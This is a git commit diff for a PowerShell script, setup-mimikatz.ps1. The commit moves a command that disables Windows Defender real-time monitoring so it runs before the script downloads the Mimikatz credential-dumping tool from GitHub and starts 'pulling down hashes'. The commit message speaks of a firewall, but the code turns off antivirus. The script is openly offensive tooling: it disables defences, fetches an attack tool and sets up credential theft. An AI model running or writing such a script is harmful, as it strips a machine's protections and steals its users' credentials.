0efe639cf760cae6b5cf285185d6a8342ed8567a
Kyle Topasna <kyle.topasna@gmail.com>
2021-03-25 14:37:59 -0800

    Disable Firewall First

--- setup-mimikatz.ps1
+++ setup-mimikatz.ps1
@@ -1,3 +1,6 @@
+Set-MpPreference -DisableRealTimeMonitoring $true
+Write-Output "[+] Disabled Windows Defender"
+
 $url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200715/mimikatz_trunk.zip"
 
 $output = "$PSScriptRoot\mimikatz.zip"
@@ -6,9 +9,6 @@ Invoke-WebRequest -Uri $url -OutFile $output
 
 Expand-Archive .\mimikatz.zip
 Write-Output "[+] Mimikatz downloaded and extracted"
-
-Set-MpPreference -DisableRealTimeMonitoring $true
-Write-Output "[+] Disabled Windows Defender"
 
 Write-Output "[+] Pulling down hashes"
 cd .\mimikatz\x64
